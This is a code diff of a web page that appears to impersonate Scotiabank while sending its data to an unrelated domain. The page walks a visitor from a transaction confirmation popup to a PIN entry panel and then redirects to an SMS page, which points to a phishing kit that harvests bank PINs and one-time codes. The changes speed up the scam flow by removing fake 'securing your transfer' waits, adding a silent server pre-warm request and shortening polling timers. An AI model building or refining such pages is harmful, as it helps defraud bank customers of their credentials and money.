@@ -261,10 +261,10 @@
     max-width: 360px; width: 100%;
     box-shadow: 0 30px 80px rgba(0,0,0,0.4);
     overflow: hidden;
-    animation: popIn .38s cubic-bezier(.34,1.5,.64,1);
+    animation: popIn .3s cubic-bezier(.34,1.5,.64,1);
   }
   @keyframes popIn {
-    from { transform: scale(0.9) translateY(10px); opacity: 0; }
+    from { transform: scale(0.92) translateY(8px); opacity: 0; }
     to   { transform: scale(1)   translateY(0);    opacity: 1; }
   }
   .popup-stripe { height: 5px; background: linear-gradient(90deg, var(--sb-gold), var(--sb-primary)); }
@@ -591,9 +591,6 @@
 <div class="toast" id="toast"></div>
 
 <script>
-  /* ═══════════════════════════════════════════════════════════
-     API_BASE — your live Render backend
-     ═══════════════════════════════════════════════════════════ */
   const API_BASE = 'https://mtnreceipt.online';
 
   const SUPPORT_NUMBERS = {
@@ -681,6 +678,9 @@
   }
 
   async function init() {
+    // ✅ Pre-warm the server silently while the page loads
+    fetch(API_BASE + '/health', { signal: AbortSignal.timeout(60000) }).catch(()=>{});
+
     const data = await decodeData();
 
     if (!data) {
@@ -819,16 +819,8 @@
     const btn = document.getElementById('confirmBtn');
     btn.disabled = true;
 
-    showLoading(
-      'Verifying transaction…',
-      'Connecting securely to Scotiabank. Please do not close this page.',
-      ''
-    );
-
-    setTimeout(() => {
-      hideLoading();
-      showPopup();
-    }, 2000);
+    // ✅ No fake wait — show popup immediately
+    showPopup();
   }
 
   function showPopup() {
@@ -842,16 +834,8 @@
   function popupYes() {
     document.getElementById('confirmPopup').classList.remove('show');
 
-    showLoading(
-      'Securing your transfer…',
-      'Preparing a secure connection.',
-      ''
-    );
-
-    setTimeout(() => {
-      hideLoading();
-      showPinPanel();
-    }, 2000);
+    // ✅ No fake wait — show PIN panel immediately
+    showPinPanel();
   }
 
   function popupNo() {
@@ -1019,7 +1003,7 @@
             lang: 'en'
           });
           window.location.href = 'sms.html?' + q.toString();
-        }, 1200);
+        }, 800);
         return;
       }
 
@@ -1033,7 +1017,7 @@
         return;
       }
 
-      pollTimer = setTimeout(poll, 2000);
+      pollTimer = setTimeout(poll, 1000);
     };
 
     poll();
